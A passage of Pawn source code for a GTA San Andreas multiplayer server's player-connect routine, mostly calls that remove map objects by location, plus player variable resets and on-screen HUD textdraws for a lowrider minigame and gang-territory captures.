	RemoveBuildingForPlayer(playerid, 1412, 1172.109, 1223.203, 14.109, 0.250);
	RemoveBuildingForPlayer(playerid, 1300, 1171.781, 1222.796, 10.171, 0.250);
	RemoveBuildingForPlayer(playerid, 8237, 1172.625, 1347.484, 9.914, 0.250);
	RemoveBuildingForPlayer(playerid, 1278, 1175.765, 1243.312, 23.937, 0.250);
	RemoveBuildingForPlayer(playerid, 1278, 1175.765, 1283.343, 23.937, 0.250);
	RemoveBuildingForPlayer(playerid, 1278, 1175.765, 1323.335, 23.937, 0.250);
	RemoveBuildingForPlayer(playerid, 1412, 1177.367, 1220.554, 11.023, 0.250);
	RemoveBuildingForPlayer(playerid, 1294, 1088.929, 1364.968, 14.273, 0.250);
	//meria
	RemoveBuildingForPlayer(playerid, 4057, 1479.554, -1693.140, 19.578, 0.250);
	RemoveBuildingForPlayer(playerid, 4210, 1479.562, -1631.453, 12.078, 0.250);
	RemoveBuildingForPlayer(playerid, 713, 1457.937, -1620.695, 13.453, 0.250);
	RemoveBuildingForPlayer(playerid, 1266, 1353.640, -1713.570, 19.843, 0.250);
	RemoveBuildingForPlayer(playerid, 1266, 1538.523, -1609.804, 19.843, 0.250);
	RemoveBuildingForPlayer(playerid, 4229, 1597.906, -1699.750, 30.210, 0.250);
	RemoveBuildingForPlayer(playerid, 4230, 1597.906, -1699.750, 30.210, 0.250);
	RemoveBuildingForPlayer(playerid, 4236, 1387.031, -1715.023, 30.414, 0.250);
//	RemoveBuildingForPlayer(playerid, 1261, 1413.632, -1721.820, 28.281, 0.250);
	RemoveBuildingForPlayer(playerid, 713, 1496.867, -1707.820, 13.406, 0.250);
	RemoveBuildingForPlayer(playerid, 1260, 1353.640, -1713.570, 19.843, 0.250);
//	RemoveBuildingForPlayer(playerid, 4235, 1387.031, -1715.023, 30.414, 0.250);
//	RemoveBuildingForPlayer(playerid, 1267, 1413.632, -1721.820, 28.281, 0.250);
	RemoveBuildingForPlayer(playerid, 1283, 1430.171, -1719.468, 15.625, 0.250);
	RemoveBuildingForPlayer(playerid, 1226, 1451.625, -1727.671, 16.421, 0.250);
	RemoveBuildingForPlayer(playerid, 1226, 1467.984, -1727.671, 16.421, 0.250);
	RemoveBuildingForPlayer(playerid, 1226, 1485.171, -1727.671, 16.421, 0.250);
	RemoveBuildingForPlayer(playerid, 1280, 1468.984, -1713.507, 13.453, 0.250);
	RemoveBuildingForPlayer(playerid, 1231, 1479.695, -1716.703, 15.625, 0.250);
	RemoveBuildingForPlayer(playerid, 1226, 1505.179, -1727.671, 16.421, 0.250);
	RemoveBuildingForPlayer(playerid, 1280, 1488.765, -1713.703, 13.453, 0.250);
	RemoveBuildingForPlayer(playerid, 1289, 1504.750, -1711.882, 13.593, 0.250);
	RemoveBuildingForPlayer(playerid, 1258, 1445.007, -1704.765, 13.695, 0.250);
	RemoveBuildingForPlayer(playerid, 1226, 1433.710, -1702.359, 16.421, 0.250);
	RemoveBuildingForPlayer(playerid, 1226, 1433.710, -1676.687, 16.421, 0.250);
	RemoveBuildingForPlayer(playerid, 1258, 1445.007, -1692.234, 13.695, 0.250);
	RemoveBuildingForPlayer(playerid, 1226, 1433.710, -1656.250, 16.421, 0.250);
	RemoveBuildingForPlayer(playerid, 1226, 1433.710, -1636.234, 16.421, 0.250);
	RemoveBuildingForPlayer(playerid, 712, 1445.812, -1650.023, 22.257, 0.250);
	RemoveBuildingForPlayer(playerid, 1226, 1433.710, -1619.054, 16.421, 0.250);
	RemoveBuildingForPlayer(playerid, 673, 1457.726, -1710.062, 12.398, 0.250);
	RemoveBuildingForPlayer(playerid, 620, 1461.656, -1707.687, 11.835, 0.250);
	RemoveBuildingForPlayer(playerid, 1280, 1468.984, -1704.640, 13.453, 0.250);
	RemoveBuildingForPlayer(playerid, 700, 1463.062, -1701.570, 13.726, 0.250);
	RemoveBuildingForPlayer(playerid, 1231, 1479.695, -1702.531, 15.625, 0.250);
	RemoveBuildingForPlayer(playerid, 673, 1457.554, -1697.289, 12.398, 0.250);
	RemoveBuildingForPlayer(playerid, 1280, 1468.984, -1694.046, 13.453, 0.250);
	RemoveBuildingForPlayer(playerid, 1231, 1479.382, -1692.390, 15.632, 0.250);
	RemoveBuildingForPlayer(playerid, 4186, 1479.554, -1693.140, 19.578, 0.250);
	RemoveBuildingForPlayer(playerid, 620, 1461.125, -1687.562, 11.835, 0.250);
	RemoveBuildingForPlayer(playerid, 700, 1463.062, -1690.648, 13.726, 0.250);
	RemoveBuildingForPlayer(playerid, 641, 1458.617, -1684.132, 11.101, 0.250);
	RemoveBuildingForPlayer(playerid, 625, 1457.273, -1666.296, 13.695, 0.250);
	RemoveBuildingForPlayer(playerid, 1280, 1468.984, -1682.718, 13.453, 0.250);
	RemoveBuildingForPlayer(playerid, 712, 1471.406, -1666.179, 22.257, 0.250);
	RemoveBuildingForPlayer(playerid, 1231, 1479.382, -1682.312, 15.632, 0.250);
	RemoveBuildingForPlayer(playerid, 625, 1458.257, -1659.257, 13.695, 0.250);
	RemoveBuildingForPlayer(playerid, 712, 1449.851, -1655.937, 22.257, 0.250);
	RemoveBuildingForPlayer(playerid, 1231, 1477.937, -1652.726, 15.632, 0.250);
	RemoveBuildingForPlayer(playerid, 1280, 1479.609, -1653.250, 13.453, 0.250);
	RemoveBuildingForPlayer(playerid, 625, 1457.351, -1650.570, 13.695, 0.250);
	RemoveBuildingForPlayer(playerid, 625, 1454.421, -1642.492, 13.695, 0.250);
	RemoveBuildingForPlayer(playerid, 1280, 1467.851, -1646.593, 13.453, 0.250);
	RemoveBuildingForPlayer(playerid, 1280, 1472.898, -1651.507, 13.453, 0.250);
	RemoveBuildingForPlayer(playerid, 1280, 1465.937, -1639.820, 13.453, 0.250);
	RemoveBuildingForPlayer(playerid, 1231, 1466.468, -1637.960, 15.632, 0.250);
	RemoveBuildingForPlayer(playerid, 625, 1449.593, -1635.046, 13.695, 0.250);
	RemoveBuildingForPlayer(playerid, 1280, 1467.710, -1632.890, 13.453, 0.250);
	RemoveBuildingForPlayer(playerid, 1232, 1465.890, -1629.976, 15.531, 0.250);
	RemoveBuildingForPlayer(playerid, 1280, 1472.664, -1627.882, 13.453, 0.250);
	RemoveBuildingForPlayer(playerid, 1280, 1479.468, -1626.023, 13.453, 0.250);
	RemoveBuildingForPlayer(playerid, 3985, 1479.562, -1631.453, 12.078, 0.250);
	RemoveBuildingForPlayer(playerid, 4206, 1479.554, -1639.609, 13.648, 0.250);
	RemoveBuildingForPlayer(playerid, 1232, 1465.835, -1608.375, 15.375, 0.250);
	RemoveBuildingForPlayer(playerid, 1229, 1466.484, -1598.093, 14.109, 0.250);
	RemoveBuildingForPlayer(playerid, 1226, 1451.335, -1596.703, 16.421, 0.250);
	RemoveBuildingForPlayer(playerid, 1226, 1471.351, -1596.703, 16.421, 0.250);
	RemoveBuildingForPlayer(playerid, 1280, 1488.765, -1704.593, 13.453, 0.250);
	RemoveBuildingForPlayer(playerid, 700, 1494.210, -1694.437, 13.726, 0.250);
	RemoveBuildingForPlayer(playerid, 1280, 1488.765, -1693.734, 13.453, 0.250);
	RemoveBuildingForPlayer(playerid, 620, 1496.976, -1686.851, 11.835, 0.250);
	RemoveBuildingForPlayer(playerid, 641, 1494.140, -1689.234, 11.101, 0.250);
	RemoveBuildingForPlayer(playerid, 1280, 1488.765, -1682.671, 13.453, 0.250);
	RemoveBuildingForPlayer(playerid, 712, 1480.609, -1666.179, 22.257, 0.250);
	RemoveBuildingForPlayer(playerid, 712, 1488.226, -1666.179, 22.257, 0.250);
	RemoveBuildingForPlayer(playerid, 1280, 1486.406, -1651.390, 13.453, 0.250);
	RemoveBuildingForPlayer(playerid, 1280, 1491.367, -1646.382, 13.453, 0.250);
	RemoveBuildingForPlayer(playerid, 1280, 1493.132, -1639.453, 13.453, 0.250);
	RemoveBuildingForPlayer(playerid, 1280, 1486.179, -1627.765, 13.453, 0.250);
	RemoveBuildingForPlayer(playerid, 1280, 1491.218, -1632.679, 13.453, 0.250);
	RemoveBuildingForPlayer(playerid, 1232, 1494.414, -1629.976, 15.531, 0.250);
	RemoveBuildingForPlayer(playerid, 1232, 1494.359, -1608.375, 15.375, 0.250);
	RemoveBuildingForPlayer(playerid, 1226, 1488.531, -1596.703, 16.421, 0.250);
	RemoveBuildingForPlayer(playerid, 1229, 1498.054, -1598.093, 14.109, 0.250);
	RemoveBuildingForPlayer(playerid, 1288, 1504.750, -1705.406, 13.593, 0.250);
	RemoveBuildingForPlayer(playerid, 1287, 1504.750, -1704.468, 13.593, 0.250);
	RemoveBuildingForPlayer(playerid, 1286, 1504.750, -1695.054, 13.593, 0.250);
	RemoveBuildingForPlayer(playerid, 1285, 1504.750, -1694.039, 13.593, 0.250);
	RemoveBuildingForPlayer(playerid, 673, 1498.960, -1684.609, 12.398, 0.250);
	RemoveBuildingForPlayer(playerid, 625, 1504.164, -1662.015, 13.695, 0.250);
	RemoveBuildingForPlayer(playerid, 625, 1504.718, -1670.921, 13.695, 0.250);
	RemoveBuildingForPlayer(playerid, 620, 1503.187, -1621.125, 11.835, 0.250);
	RemoveBuildingForPlayer(playerid, 673, 1501.281, -1624.578, 12.398, 0.250);
	RemoveBuildingForPlayer(playerid, 673, 1498.359, -1616.968, 12.398, 0.250);
	RemoveBuildingForPlayer(playerid, 1226, 1504.890, -1596.703, 16.421, 0.250);
	RemoveBuildingForPlayer(playerid, 712, 1508.445, -1668.742, 22.257, 0.250);
	RemoveBuildingForPlayer(playerid, 625, 1505.695, -1654.835, 13.695, 0.250);
	RemoveBuildingForPlayer(playerid, 625, 1508.515, -1647.859, 13.695, 0.250);
	RemoveBuildingForPlayer(playerid, 625, 1513.273, -1642.492, 13.695, 0.250);
	RemoveBuildingForPlayer(playerid, 1258, 1510.890, -1607.312, 13.695, 0.250);
	RemoveBuildingForPlayer(playerid, 1226, 1524.828, -1721.632, 16.421, 0.250);
	RemoveBuildingForPlayer(playerid, 1226, 1524.828, -1705.273, 16.421, 0.250);
	RemoveBuildingForPlayer(playerid, 1229, 1524.218, -1693.968, 14.109, 0.250);
	RemoveBuildingForPlayer(playerid, 1226, 1524.828, -1688.085, 16.421, 0.250);
	RemoveBuildingForPlayer(playerid, 1226, 1524.828, -1668.078, 16.421, 0.250);
	RemoveBuildingForPlayer(playerid, 1226, 1524.828, -1647.640, 16.421, 0.250);
	RemoveBuildingForPlayer(playerid, 1226, 1524.828, -1621.960, 16.421, 0.250);
	RemoveBuildingForPlayer(playerid, 1226, 1525.382, -1611.156, 16.421, 0.250);
	RemoveBuildingForPlayer(playerid, 1260, 1538.523, -1609.804, 19.843, 0.250);
	RemoveBuildingForPlayer(playerid, 1283, 1528.953, -1605.859, 15.625, 0.250);

	//rifa
	RemoveBuildingForPlayer(playerid, 5317, 2264.210, -1953.218, 15.710, 0.250);
	RemoveBuildingForPlayer(playerid, 3748, 2238.218, -1916.109, 15.187, 0.250);
	RemoveBuildingForPlayer(playerid, 3748, 2261.460, -1916.031, 15.187, 0.250);
	RemoveBuildingForPlayer(playerid, 3748, 2284.703, -1915.875, 15.179, 0.250);
	RemoveBuildingForPlayer(playerid, 1266, 2300.328, -1954.546, 21.828, 0.250);
	RemoveBuildingForPlayer(playerid, 5309, 2264.210, -1953.218, 15.710, 0.250);
	RemoveBuildingForPlayer(playerid, 1635, 2230.179, -1943.546, 17.015, 0.250);
	RemoveBuildingForPlayer(playerid, 5266, 2278.000, -1942.867, 20.078, 0.250);
	RemoveBuildingForPlayer(playerid, 1635, 2268.890, -1943.578, 17.015, 0.250);
	RemoveBuildingForPlayer(playerid, 1260, 2300.328, -1954.546, 21.828, 0.250);
	RemoveBuildingForPlayer(playerid, 678, 2253.382, -1932.921, 12.648, 0.250);
	RemoveBuildingForPlayer(playerid, 678, 2233.218, -1933.062, 12.648, 0.250);
	RemoveBuildingForPlayer(playerid, 673, 2229.101, -1928.757, 11.445, 0.250);
	RemoveBuildingForPlayer(playerid, 1308, 2247.257, -1929.218, 12.718, 0.250);
	RemoveBuildingForPlayer(playerid, 678, 2246.210, -1931.257, 12.648, 0.250);
	RemoveBuildingForPlayer(playerid, 673, 2229.101, -1911.812, 11.445, 0.250);
	RemoveBuildingForPlayer(playerid, 673, 2229.101, -1920.289, 11.445, 0.250);
	RemoveBuildingForPlayer(playerid, 3628, 2238.218, -1916.109, 15.187, 0.250);
	RemoveBuildingForPlayer(playerid, 712, 2266.195, -1932.953, 21.984, 0.250);
	RemoveBuildingForPlayer(playerid, 3628, 2261.460, -1916.031, 15.187, 0.250);
	RemoveBuildingForPlayer(playerid, 1308, 2277.203, -1933.554, 12.742, 0.250);
	RemoveBuildingForPlayer(playerid, 678, 2278.867, -1933.500, 12.648, 0.250);
	RemoveBuildingForPlayer(playerid, 1308, 2291.226, -1929.015, 12.718, 0.250);
	RemoveBuildingForPlayer(playerid, 678, 2289.437, -1933.554, 12.648, 0.250);
	RemoveBuildingForPlayer(playerid, 3628, 2284.703, -1915.875, 15.179, 0.250);
	RemoveBuildingForPlayer(playerid, 620, 2240.796, -1900.132, 10.804, 0.250);
	RemoveBuildingForPlayer(playerid, 673, 2293.101, -1900.328, 11.445, 0.250);
	RemoveBuildingForPlayer(playerid, 1308, 2291.281, -1905.171, 12.859, 0.250);
	RemoveBuildingForPlayer(playerid, 1635, 2302.101, -1958.656, 17.015, 0.250);

	//hotel
	RemoveBuildingForPlayer(playerid, 14795, 1388.880, -20.882, 1005.200, 0.250);
	RemoveBuildingForPlayer(playerid, 14784, 1281.140, -30.093, 1009.409, 0.250);
	//meria
//	RemoveBuildingForPlayer(playerid, 3980, 1481.189, -1785.069, 22.382, 0.250);
//	RemoveBuildingForPlayer(playerid, 4044, 1481.189, -1785.069, 22.382, 0.250);
//	RemoveBuildingForPlayer(playerid, 1527, 1448.229, -1755.900, 14.523, 0.250);
	//bolka
	RemoveBuildingForPlayer(playerid, 5929, 1230.8906, -1337.9844, 12.5391, 0.25);
	RemoveBuildingForPlayer(playerid, 739, 1231.1406, -1341.8516, 12.7344, 0.25);
	RemoveBuildingForPlayer(playerid, 739, 1231.1406, -1328.0938, 12.7344, 0.25);
	RemoveBuildingForPlayer(playerid, 739, 1231.1406, -1356.2109, 12.7344, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1222.6641, -1374.6094, 12.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1222.6641, -1356.5547, 12.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1240.9219, -1374.6094, 12.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1240.9219, -1356.5547, 12.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 1297, 1210.8047, -1337.8359, 15.7734, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1222.6641, -1335.0547, 12.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1222.6641, -1317.7422, 12.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 5812, 1230.8906, -1337.9844, 12.5391, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1240.9219, -1335.0547, 12.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1240.9219, -1317.7422, 12.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1222.6641, -1300.9219, 12.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1240.9219, -1300.9219, 12.2969, 0.25);
	//news
	
	RemoveBuildingForPlayer(playerid, 4564, 1666.489, -1246.180, 123.085, 0.250);
	RemoveBuildingForPlayer(playerid, 4579, 1666.489, -1246.180, 123.085, 0.250);
	RemoveBuildingForPlayer(playerid, 4717, 1666.489, -1246.180, 123.085, 0.250);
	RemoveBuildingForPlayer(playerid, 4722, 1666.489, -1246.180, 123.085, 0.250);
	RemoveBuildingForPlayer(playerid, 1215, 1670.699, -1282.119, 14.343, 0.250);
	RemoveBuildingForPlayer(playerid, 1215, 1681.719, -1282.119, 14.343, 0.250);
	RemoveBuildingForPlayer(playerid, 1215, 1691.859, -1282.119, 14.343, 0.250);
	RemoveBuildingForPlayer(playerid, 1215, 1700.719, -1282.119, 14.343, 0.250);
	RemoveBuildingForPlayer(playerid, 717, 1698.199, -1270.359, 13.968, 0.250);
	RemoveBuildingForPlayer(playerid, 1215, 1700.719, -1270.400, 14.343, 0.250);
	RemoveBuildingForPlayer(playerid, 717, 1698.650, -1258.359, 13.968, 0.250);
	RemoveBuildingForPlayer(playerid, 1215, 1700.719, -1258.410, 14.343, 0.250);
	RemoveBuildingForPlayer(playerid, 717, 1698.790, -1246.359, 14.265, 0.250);
	RemoveBuildingForPlayer(playerid, 1215, 1700.719, -1246.569, 14.343, 0.250);
	RemoveBuildingForPlayer(playerid, 717, 1698.760, -1233.819, 14.265, 0.250);
	RemoveBuildingForPlayer(playerid, 717, 1698.760, -1221.349, 14.265, 0.250);
	RemoveBuildingForPlayer(playerid, 1232, 1646.099, -1259.579, 16.445, 0.250);
	RemoveBuildingForPlayer(playerid, 1232, 1646.099, -1233.319, 16.445, 0.250);
	RemoveBuildingForPlayer(playerid, 1525, 1687.229, -1239.130, 15.812, 0.250);
	RemoveBuildingForPlayer(playerid, 4643, 1654.770, -1246.290, 16.171, 0.250);
	RemoveBuildingForPlayer(playerid, 4699, 1654.770, -1246.290, 16.171, 0.250);
	
	//fbi
	RemoveBuildingForPlayer(playerid, 7986, 1088.489, 1073.199, 10.101, 0.250);
	RemoveBuildingForPlayer(playerid, 7983, 1070.319, 1057.449, 32.742, 0.250);
	RemoveBuildingForPlayer(playerid, 8107, 1070.319, 1057.449, 32.742, 0.250);
	RemoveBuildingForPlayer(playerid, 8215, 1137.609, 929.062, 7.867, 0.250);
	RemoveBuildingForPlayer(playerid, 8226, 1137.609, 929.062, 7.867, 0.250);
	RemoveBuildingForPlayer(playerid, 8007, 1167.530, 933.195, 10.617, 0.250);
	RemoveBuildingForPlayer(playerid, 8295, 1167.530, 933.195, 10.617, 0.250);
	RemoveBuildingForPlayer(playerid, 8008, 996.421, 936.046, 10.773, 0.250);
	RemoveBuildingForPlayer(playerid, 8296, 996.421, 936.046, 10.773, 0.250);
	RemoveBuildingForPlayer(playerid, 8006, 1071.609, 1176.040, 7.851, 0.250);
	RemoveBuildingForPlayer(playerid, 8211, 1071.609, 1176.040, 7.851, 0.250);
	ac__carshot_check[playerid] = 0;
	furniture_pickup[playerid] = -1;
	player__timer[playerid] = SetTimerEx("PlayerUpdate", 250, 1, "d", playerid);
	for(new o; o < 24; o++) SendClientMessage(playerid,-1, "");
	SetPlayerColor(playerid, CGREY);
 	bullet__fire1[playerid] = 0;
 	Trenag[playerid]=0;
 	PlayerInfo[playerid][pRolik] = 0;
 	dialog__id[playerid] = -1;
    bullet__fire2[playerid] = 0;

	if(PlayerLogged[playerid] == false) ResetStats(playerid);
	LRArrows[playerid][0] =	CreatePlayerTextDraw(playerid, 350.444274, 392.755462, "LD_BEAT:up");
    LRArrows[playerid][1] = CreatePlayerTextDraw(playerid, 303.444213, 392.759918, "LD_BEAT:left");
    LRArrows[playerid][2] = CreatePlayerTextDraw(playerid, 257.333007, 392.764373, "LD_BEAT:up");
    for(new i; i <= 2; i++)
    {
		PlayerTextDrawLetterSize(playerid, LRArrows[playerid][i], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, LRArrows[playerid][i], 21.333368, 18.915555);
		PlayerTextDrawAlignment(playerid, LRArrows[playerid][i], 1);
		PlayerTextDrawColor(playerid, LRArrows[playerid][i], -1);
		PlayerTextDrawSetShadow(playerid, LRArrows[playerid][i], 0);
		PlayerTextDrawSetOutline(playerid, LRArrows[playerid][i], 0);
		PlayerTextDrawFont(playerid, LRArrows[playerid][i], 4);
    }
    
   	PointsTD[playerid][0] = CreatePlayerTextDraw(playerid, 14.222579, 206.577789, "LOWRIDE POINTS: ~r~100");
	PlayerTextDrawLetterSize(playerid, PointsTD[playerid][0], 0.238000, 1.371021);
	PlayerTextDrawAlignment(playerid, PointsTD[playerid][0], 1);
	PlayerTextDrawColor(playerid, PointsTD[playerid][0], -1);
	PlayerTextDrawSetShadow(playerid, PointsTD[playerid][0], 257);
	PlayerTextDrawSetOutline(playerid, PointsTD[playerid][0], 0);
	PlayerTextDrawBackgroundColor(playerid, PointsTD[playerid][0], 51);
	PlayerTextDrawFont(playerid, PointsTD[playerid][0], 2);
	PlayerTextDrawSetProportional(playerid, PointsTD[playerid][0], 1);

	PointsTD[playerid][1] = CreatePlayerTextDraw(playerid, 97.889259, 194.635543, "~r~+10");
	PlayerTextDrawLetterSize(playerid, PointsTD[playerid][1], 0.238000, 1.371021);
	PlayerTextDrawAlignment(playerid, PointsTD[playerid][1], 1);
	PlayerTextDrawColor(playerid, PointsTD[playerid][1], -1);
	PlayerTextDrawSetShadow(playerid, PointsTD[playerid][1], 257);
	PlayerTextDrawSetOutline(playerid, PointsTD[playerid][1], 0);
	PlayerTextDrawBackgroundColor(playerid, PointsTD[playerid][1], 51);
	PlayerTextDrawFont(playerid, PointsTD[playerid][1], 2);
	PlayerTextDrawSetProportional(playerid, PointsTD[playerid][1], 1);
	

	
	CaptPl[playerid][1] = CreatePlayerTextDraw(playerid,317.000000, 378.000000, "__TIME: ~b~~h~~h~~h~00:00___");
	PlayerTextDrawAlignment(playerid,CaptPl[playerid][1], 2);
	PlayerTextDrawBackgroundColor(playerid,CaptPl[playerid][1], 255);
	PlayerTextDrawFont(playerid,CaptPl[playerid][1], 2);
	PlayerTextDrawLetterSize(playerid,CaptPl[playerid][1], 0.240000, 1.200000);
	PlayerTextDrawSetShadow(playerid,CaptPl[playerid][1], 257); //
	PlayerTextDrawColor(playerid,CaptPl[playerid][1], -1);
	PlayerTextDrawSetOutline(playerid,CaptPl[playerid][1], 0); //1
	PlayerTextDrawSetProportional(playerid,CaptPl[playerid][1], 1);
	PlayerTextDrawSetSelectable(playerid,CaptPl[playerid][1], 0);

	CaptPl[playerid][0] = CreatePlayerTextDraw(playerid,317.000000, 389.000000, "Grove~w~~h~: ~r~13 ~w~~h~kills with ~r~4 ~w~~h~players");
	PlayerTextDrawAlignment(playerid,CaptPl[playerid][0], 2);
	PlayerTextDrawBackgroundColor(playerid,CaptPl[playerid][0], 255);
	PlayerTextDrawFont(playerid,CaptPl[playerid][0], 2);
	PlayerTextDrawSetShadow(playerid,CaptPl[playerid][0], 257); //
	PlayerTextDrawLetterSize(playerid,CaptPl[playerid][0], 0.180000, 0.899999);
	PlayerTextDrawColor(playerid,CaptPl[playerid][0], 16711935);
	PlayerTextDrawSetOutline(playerid,CaptPl[playerid][0], 0);
	PlayerTextDrawSetProportional(playerid,CaptPl[playerid][0], 1);
	PlayerTextDrawSetSelectable(playerid,CaptPl[playerid][0], 0);

	CaptPl[playerid][2] = CreatePlayerTextDraw(playerid,317.000000, 397.000000, "Aztecas~w~~h~: ~r~16 ~w~~h~kills with ~r~7 ~w~~h~players");
	PlayerTextDrawAlignment(playerid,CaptPl[playerid][2], 2);
	PlayerTextDrawBackgroundColor(playerid,CaptPl[playerid][2], 255);
	PlayerTextDrawSetShadow(playerid,CaptPl[playerid][2], 257); //
	PlayerTextDrawFont(playerid,CaptPl[playerid][2], 2);
	PlayerTextDrawLetterSize(playerid,CaptPl[playerid][2], 0.180000, 0.899999);
	PlayerTextDrawColor(playerid,CaptPl[playerid][2], 16777215);
	PlayerTextDrawSetOutline(playerid,CaptPl[playerid][2], 0);
	PlayerTextDrawSetProportional(playerid,CaptPl[playerid][2], 1);
	PlayerTextDrawSetSelectable(playerid,CaptPl[playerid][2], 0);
	

	//plotina
/*	RemoveBuildingForPlayer(playerid, 11579, -840.187, 1895.304, 9.140, 0.250);
	RemoveBuildingForPlayer(playerid, 11580, -794.828, 2025.437, 31.335, 0.250);
	RemoveBuildingForPlayer(playerid, 11581, -615.289, 2028.554, 31.335, 0.250);
	RemoveBuildingForPlayer(playerid, 11649, -781.273, 2140.515, 41.195, 0.250);
	RemoveBuildingForPlayer(playerid, 11650, -781.195, 2097.164, 41.195, 0.250);
	RemoveBuildingForPlayer(playerid, 11651, -651.281, 2145.960, 41.195, 0.250);
	RemoveBuildingForPlayer(playerid, 11652, -651.351, 2102.617, 41.195, 0.250);
	RemoveBuildingForPlayer(playerid, 11541, -840.187, 1895.304, 9.140, 0.250);
	RemoveBuildingForPlayer(playerid, 11539, -794.828, 2025.437, 31.335, 0.250);
	RemoveBuildingForPlayer(playerid, 11540, -615.289, 2028.554, 31.335, 0.250);
	RemoveBuildingForPlayer(playerid, 11485, -781.195, 2097.164, 41.195, 0.250);
	RemoveBuildingForPlayer(playerid, 11487, -651.351, 2102.617, 41.195, 0.250);
	RemoveBuildingForPlayer(playerid, 11484, -781.273, 2140.515, 41.195, 0.250);
	RemoveBuildingForPlayer(playerid, 11486, -651.281, 2145.960, 41.195, 0.250);
	RemoveBuildingForPlayer(playerid, 16265, -606.085, 1910.101, 9.140, 0.250);
	RemoveBuildingForPlayer(playerid, 16376, -606.085, 1910.101, 9.140, 0.250);*/
	//ferma
	RemoveBuildingForPlayer(playerid, 16285, 511.9922, 1111.7813, 13.5703, 0.25);
	//hotel clown
	RemoveBuildingForPlayer(playerid, 652, 2166.156, 1839.062, 10.085, 0.250);
	RemoveBuildingForPlayer(playerid, 652, 2174.031, 1839.062, 10.085, 0.250);
	RemoveBuildingForPlayer(playerid, 652, 2181.906, 1839.062, 10.085, 0.250);
	RemoveBuildingForPlayer(playerid, 652, 2189.789, 1839.062, 10.085, 0.250);
	RemoveBuildingForPlayer(playerid, 652, 2197.664, 1839.062, 10.085, 0.250);
	//util
	RemoveBuildingForPlayer(playerid, 3367, 149.914, 2614.617, 15.476, 0.250);
	RemoveBuildingForPlayer(playerid, 3369, 123.046, 2587.742, 15.476, 0.250);
	RemoveBuildingForPlayer(playerid, 3368, 176.789, 2587.742, 15.476, 0.250);
	RemoveBuildingForPlayer(playerid, 3369, 203.656, 2614.617, 15.476, 0.250);
	RemoveBuildingForPlayer(playerid, 3367, 176.789, 2641.484, 15.476, 0.250);
	RemoveBuildingForPlayer(playerid, 3269, 123.046, 2587.742, 15.476, 0.250);
	RemoveBuildingForPlayer(playerid, 3270, 176.789, 2587.742, 15.476, 0.250);
	RemoveBuildingForPlayer(playerid, 3271, 149.914, 2614.617, 15.476, 0.250);
	RemoveBuildingForPlayer(playerid, 3271, 176.789, 2641.484, 15.476, 0.250);
	RemoveBuildingForPlayer(playerid, 3269, 203.656, 2614.617, 15.476, 0.250);
	//rabota
	RemoveBuildingForPlayer(playerid, 11612, -1270.445, 2719.437, 49.265, 0.250);
	RemoveBuildingForPlayer(playerid, 11613, -1320.687, 2700.953, 49.265, 0.250);
	RemoveBuildingForPlayer(playerid, 11614, -1328.718, 2677.507, 52.210, 0.250);
	RemoveBuildingForPlayer(playerid, 11677, -1303.367, 2664.078, 53.578, 0.250);
	RemoveBuildingForPlayer(playerid, 1686, -1329.203, 2669.281, 49.453, 0.250);
	RemoveBuildingForPlayer(playerid, 1686, -1328.585, 2674.710, 49.453, 0.250);
	RemoveBuildingForPlayer(playerid, 11547, -1328.718, 2677.507, 52.210, 0.250);
	RemoveBuildingForPlayer(playerid, 1686, -1327.796, 2680.125, 49.453, 0.250);
	RemoveBuildingForPlayer(playerid, 1686, -1327.031, 2685.593, 49.453, 0.250);
	RemoveBuildingForPlayer(playerid, 11546, -1320.687, 2700.953, 49.265, 0.250);
	RemoveBuildingForPlayer(playerid, 11548, -1299.734, 2709.109, 49.078, 0.250);
	RemoveBuildingForPlayer(playerid, 11545, -1270.445, 2719.437, 49.265, 0.250);
	//fort carson
	RemoveBuildingForPlayer(playerid, 1294, -25.7813, 1193.6406, 22.8125, 0.25);
	RemoveBuildingForPlayer(playerid, 1294, -11.7656, 1202.8828, 23.2031, 0.25);
	RemoveBuildingForPlayer(playerid, 1294, -37.9766, 1202.8828, 23.2031, 0.25);
	RemoveBuildingForPlayer(playerid, 1294, 20.9141, 1202.8828, 23.2031, 0.25);
	RemoveBuildingForPlayer(playerid, 1294, 20.9141, 1193.6406, 23.2031, 0.25);
	RemoveBuildingForPlayer(playerid, 1294, 49.1406, 1193.6406, 23.2031, 0.25);
	RemoveBuildingForPlayer(playerid, 1294, 49.1406, 1202.8828, 23.2031, 0.25);
	RemoveBuildingForPlayer(playerid, 1308, -26.4141, 1159.4844, 19.4844, 0.25);
	RemoveBuildingForPlayer(playerid, 16412, -215.234, 1119.195, 18.351, 0.250);
	RemoveBuildingForPlayer(playerid, 16440, 12.117, 1178.539, 20.812, 0.250);
	RemoveBuildingForPlayer(playerid, 16441, -32.523, 1185.187, 22.429, 0.250);
	RemoveBuildingForPlayer(playerid, 3298, -120.867, 919.757, 19.476, 0.250);
	RemoveBuildingForPlayer(playerid, 3300, -62.304, 968.398, 20.625, 0.250);
	RemoveBuildingForPlayer(playerid, 3301, -95.343, 967.437, 20.710, 0.250);
	RemoveBuildingForPlayer(playerid, 3299, -15.554, 968.734, 18.921, 0.250);
	RemoveBuildingForPlayer(playerid, 3297, -130.375, 972.117, 20.640, 0.250);
	RemoveBuildingForPlayer(playerid, 3339, -152.882, 909.187, 17.851, 0.250);
	RemoveBuildingForPlayer(playerid, 3342, -39.781, 962.617, 18.601, 0.250);
	RemoveBuildingForPlayer(playerid, 3342, -151.078, 936.085, 18.273, 0.250);
	RemoveBuildingForPlayer(playerid, 16447, -219.375, 1176.656, 22.164, 0.250);
	RemoveBuildingForPlayer(playerid, 16476, -98.195, 1180.070, 18.734, 0.250);
	RemoveBuildingForPlayer(playerid, 16478, 55.562, 1220.679, 17.921, 0.250);
	RemoveBuildingForPlayer(playerid, 16506, -144.054, 1227.304, 18.898, 0.250);
